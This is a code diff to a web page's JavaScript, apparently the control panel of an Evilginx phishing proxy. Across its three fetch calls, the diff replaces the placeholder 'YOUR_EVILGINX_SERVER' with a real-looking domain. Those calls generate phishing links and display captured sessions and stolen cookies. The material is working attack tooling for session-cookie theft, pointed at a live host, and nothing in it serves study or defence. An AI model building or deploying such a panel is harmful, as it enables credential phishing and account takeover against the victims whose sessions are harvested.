@@ -34,21 +34,21 @@
         });
 
         document.getElementById("generate-link").addEventListener("click", () => {
-            fetch("http://YOUR_EVILGINX_SERVER/api/generate", { method: "POST" })
+            fetch("http://tecan.com.co/api/generate", { method: "POST" })
                 .then(response => response.json())
                 .then(data => alert("Generated Link: " + data.link))
                 .catch(error => console.error(error));
         });
 
         document.getElementById("view-sessions").addEventListener("click", () => {
-            fetch("http://YOUR_EVILGINX_SERVER/api/sessions")
+            fetch("http://tecan.com.co/api/sessions")
                 .then(response => response.json())
                 .then(data => document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2))
                 .catch(error => console.error(error));
         });
 
         document.getElementById("view-cookies").addEventListener("click", () => {
-            fetch("http://YOUR_EVILGINX_SERVER/api/cookies")
+            fetch("http://tecan.com.co/api/cookies")
                 .then(response => response.json())
                 .then(data => document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2))
                 .catch(error => console.error(error));
